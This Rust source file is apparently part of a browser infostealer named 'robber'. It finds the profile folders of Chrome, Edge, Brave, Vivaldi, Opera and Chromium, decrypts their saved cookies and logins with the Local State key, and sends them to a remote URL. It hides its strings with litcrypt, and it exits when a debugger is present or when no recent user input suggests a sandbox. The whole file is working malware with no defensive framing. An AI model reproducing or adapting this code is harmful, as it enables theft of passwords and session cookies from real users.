use crate::robber;
use kernel32::{GetCurrentProcess, GetTickCount};
use litcrypt::{lc, use_litcrypt};
use ntapi::ntpsapi::NtQueryInformationProcess;
use std::env;
use std::ffi::c_void;
use std::path::Path;
use std::ptr::null_mut;
use winapi::um::winuser::{GetLastInputInfo, LASTINPUTINFO};

use_litcrypt!("d,yxskifg]vboxf[yfyau,jvjxj[,,/e");

fn build_base_directories() -> Result<Vec<std::path::PathBuf>, ()> {
    let mut base_directories = vec![];
    if let Some(local) = env::var_os(lc!("LOCALAPPDATA")) {
        if let Some(local) = local.to_str() {
            let local_path = Path::new(local);
            let directories_all = vec![
                local_path
                    .join(lc!("Google"))
                    .join(lc!("Chrome"))
                    .join(lc!("User Data")),
                local_path
                    .join(lc!("Microsoft"))
                    .join(lc!("Edge"))
                    .join(lc!("User Data")),
                local_path.join(lc!("Chromium")).join(lc!("User Data")),
                local_path
                    .join(lc!("BraveSoftware"))
                    .join(lc!("Brave-Browser"))
                    .join(lc!("User Data")),
                local_path.join(lc!("Vivaldi")).join(lc!("User Data")),
                local_path
                    .join(lc!("Opera Software"))
                    .join(lc!("Opera Stable")),
            ];
            for directory in directories_all {
                if directory.exists() == true {
                    base_directories.push(directory);
                }
            }
        }
    }
    Ok(base_directories)
}

fn build_cookie_directory(base_dir: &std::path::PathBuf) -> Result<std::path::PathBuf, ()> {
    let cookie_dirs = vec![
        base_dir.join(lc!("Default")).join(lc!("Cookies")),
        base_dir.join(lc!("Cookies")),
    ];
    for cookie_dir in cookie_dirs {
        if cookie_dir.exists() == true {
            return Ok(cookie_dir);
        }
    }
    Err(())
}
fn build_login_directory(base_dir: &std::path::PathBuf) -> Result<std::path::PathBuf, ()> {
    let login_dirs = vec![
        base_dir.join(lc!("Default")).join(lc!("Login Data")),
        base_dir.join(lc!("Login Data")),
    ];
    for login_dir in login_dirs {
        if login_dir.exists() == true {
            return Ok(login_dir);
        }
    }
    Err(())
}
fn build_key_directory(base_dir: &std::path::PathBuf) -> Result<std::path::PathBuf, ()> {
    let key_dir = base_dir.join(lc!("Local State"));
    if key_dir.exists() == true {
        return Ok(key_dir);
    }
    Err(())
}

pub fn run_robber(do_cookie: bool, do_login: bool, url: &str) -> Result<i32, ()> {
    unsafe {
        let p_info = &mut 0u32 as *mut u32 as *mut c_void;
        let handle = GetCurrentProcess();
        let status = NtQueryInformationProcess(handle, 7, p_info, 8, null_mut());
        if !(*(p_info as *const u32) == 0 && status == 0) {
            std::process::exit(1);
        }
        let mut last_input_info: LASTINPUTINFO = LASTINPUTINFO {
            cbSize: std::mem::size_of::<LASTINPUTINFO>() as u32,
            dwTime: 0u32,
        };
        GetLastInputInfo(&mut last_input_info);
        if GetTickCount() - last_input_info.dwTime >= 10000 {
            std::process::exit(1);
        }
    }
    let base_dirs = build_base_directories()?;
    for base_dir in base_dirs {
        let key_dir = build_key_directory(&base_dir)?;
        if let Ok(key) = robber::get_key(&key_dir) {
            if do_cookie == true {
                let cookie_dir = build_cookie_directory(&base_dir)?;

                if let Ok(cookie_data) = robber::get_cookies(&cookie_dir, &key) {
                    robber::send_data(cookie_data, format!("{}{}", url, lc!("/cookie"))).unwrap();
                }
            }
            if do_login == true {
                let login_dir = build_login_directory(&base_dir)?;
                if let Ok(login_data) = robber::get_login(&login_dir, &key) {
                    robber::send_data(login_data, format!("{}{}", url, lc!("/login"))).unwrap();
                }
            }
        }
    }
    return Ok(0);
}
